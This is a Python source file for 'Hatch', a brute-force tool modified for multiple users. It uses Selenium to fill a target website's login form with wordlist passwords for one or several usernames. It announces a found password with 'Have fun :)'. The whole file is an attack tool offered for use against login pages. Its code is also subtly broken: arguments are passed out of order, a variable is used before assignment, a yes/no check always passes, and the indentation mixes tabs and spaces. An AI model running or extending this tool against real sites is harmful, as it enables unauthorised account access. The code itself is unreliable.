"""
Original code by METACHAR & FlorianBord2

Author: dark-anub1s
Date: 4-19-2021
Added Features:
    Multi-User Support
"""

# Imports
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# Graphics
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    WHITE = '\33[37m'


# Config
parser = OptionParser()
now = datetime.datetime.now()


# Args
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("-U", "--userlist", dest="userlist", help="Choose a list of users")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()


def wizard():
    print (banner)
    website = input(Color.GREEN + Color.BOLD + '\n[~] ' + Color.WHITE + 'Enter a website: ')
    sys.stdout.write(Color.GREEN + '[!] '+Color.WHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (Color.GREEN + '[OK]'+Color.WHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (Color.RED + '[!]'+Color.WHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (Color.RED + '[X]'+Color.WHITE)
        t.sleep(1)
        print (Color.RED + '[!]'+Color.WHITE+ ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username selector: ')
    password_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the password selector: ')
    login_btn_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the Login button selector: ')
    pass_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a directory to a password list: ')
    response = input(Color.GREEN + '[~]' + Color.WHITE + 'Do you want to use a username list [y/n]: ')
    if response.lower() == 'y' or 'yes':
        user_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a list of usernames to brute-force: ')
        use_list = True
        brutes(user_list, username_selector, password_selector, login_btn_selector, pass_list, website, use_list)
    elif response.lower() == 'n' or 'no':
        username = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username to brute-force: ')
        use_list = False
        brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website, use_list)
    else:
        wizard()


def brutes(username, passlist, username_selector, password_selector, login_btn_selector, website, use_list):
    count = 0
    with open(passlist, 'r') as file:
        f = file.readlines()
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(chrome_options=optionss)
    wait = WebDriverWait(browser, 10)
    while count < len(users):
        try:
            if use_list:
                with open(username, 'r') as file2:
                    users = file2.readlines()
                    for user in users:
                        for line in f:
                            browser.get(website)
                            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                            Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                            Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                            enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                            Sel_user.send_keys(user)
                            Sel_pas.send_keys(line)
                            print ('------------------------')
                            print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
                            print ('------------------------')
                            count += 1
            else:
            	users = username
                for line in f:
                    browser.get(website)
                    wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                    Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                    Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                    enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                    Sel_user.send_keys(users)
                    Sel_pas.send_keys(line)
                    print ('------------------------')
                    print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
                    print ('------------------------')
                count = len(users)
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            print('CTRL C')
            break
        except selenium.common.exceptions.NoSuchElementException:
            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print ('LAST PASS ATTEMPT BELLOW')
            print (Color.GREEN + 'Password has been found: {0}'.format(line))
            print (Color.YELLOW + 'Have fun :)')
            exit()

banner = Color.BOLD + Color.RED +'''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
  {0}[{1}-{2}]--> {3}V.1.0
  {4}[{5}-{6}]--> {7}coded by Metachar
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(Color.RED, Color.WHITE,Color.RED,Color.GREEN,Color.RED, Color.WHITE,Color.RED,Color.GREEN,Color.RED, Color.WHITE,Color.RED,Color.GREEN)

if not options.username or not options.usernamesel or not options.passsel or not options.loginsel \
        or not options.website or not options.passlist or not options.userlist:
    wizard()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
user_list = options.userlist
print(f'User list {user_list} / Password list {pass_list}')
# print(banner)

if user_list:
    brutes(user_list, pass_list, username_selector, password_selector, login_btn_selector, website, use_list=True)
else:
    brutes(username, pass_list, username_selector, password_selector, login_btn_selector, website, use_list=False)

